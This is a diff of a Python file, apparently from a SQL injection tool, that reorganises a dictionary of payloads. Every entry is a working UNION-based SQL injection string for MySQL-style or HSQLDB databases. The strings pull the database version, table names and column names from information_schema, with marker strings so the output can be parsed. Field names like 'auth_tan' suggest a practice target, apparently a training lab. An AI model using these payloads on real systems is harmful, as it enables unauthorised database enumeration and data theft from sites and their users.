@@ -53,17 +53,26 @@ injections = {
     ],
 }
 
+        # Dump ------- Main separator: 'hola', second: 'holi'
 inject_dump = {
-    # Dump -------
-    "sql_version": "' UNION SELECT NULL, CONCAT('hola',@@version,'hola'); -- ",
-    "sql_tables": "' UNION SELECT NULL, CONCAT('hola',table_catalog,'holi',table_name,'hola') FROM information_schema.tables; -- ",
-    "sql_columns": "' UNION SELECT NULL, CONCAT('hola',table_name,'holi',column_name,'hola') FROM information_schema.columns; -- ",
+    "sql": {
+        "version": "' UNION SELECT NULL, CONCAT('hola',@@version,'hola'); -- ",
+        "tables": "' UNION SELECT NULL, CONCAT('hola',table_catalog,'holi',table_name,'hola') FROM information_schema.tables; -- ",
+        "columns": "' UNION SELECT NULL, CONCAT('hola',table_name,'holi',column_name,'hola') FROM information_schema.columns; -- ",
+        "key": "id",
+    },
 
-    "hsqldb_version": "' union select null,null,null,null,null,'hola'||character_value||'hola' from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'; -- ",
-    "hsqldb_tables": "' union select null,null,null,null,null,'hola'||table_catalog||'holi'||table_name||'hola' from information_schema.tables; -- ",
-    "hsqldb_columns": "' union select null,null,null,null,null,'hola'||table_name||'holi'||column_name||'hola' from information_schema.columns; -- ",
+    "hsqldb_n": {
+        "version": "1 union select null,null,null,null,null,'hola'||character_value||'hola',null from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'; -- ",
+        "tables": "1 union select null,null,null,null,null,'hola'||table_catalog||'holi'||table_name||'hola',null from information_schema.tables; -- ",
+        "columns": "1 union select null,null,null,null,null,'hola'||table_name||'holi'||column_name||'hola',null from information_schema.columns; -- ",
+        "key": "userid",
+    },
 
-    "hsqldb_n_version": "1 union select null,null,null,null,null,'hola'||character_value||'hola',null from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'; -- ",
-    "hsqldb_n_tables": "1 union select null,null,null,null,null,'hola'||table_catalog||'holi'||table_name||'hola',null from information_schema.tables; -- ",
-    "hsqldb_n_columns": "1 union select null,null,null,null,null,'hola'||table_name||'holi'||column_name||'hola',null from information_schema.columns; -- ",
+    "hsqldb": {
+        "version": "' union select null,null,null,null,null,'hola'||character_value||'hola' from information_schema.sql_implementation_info where implementation_info_name = 'DBMS VERSION'; -- ",
+        "tables": "' union select null,null,null,null,null,'hola'||table_catalog||'holi'||table_name||'hola' from information_schema.tables; -- ",
+        "columns": "' union select null,null,null,null,null,'hola'||table_name||'holi'||column_name||'hola' from information_schema.columns; -- ",
+        "key": "auth_tan",
+    },
 }
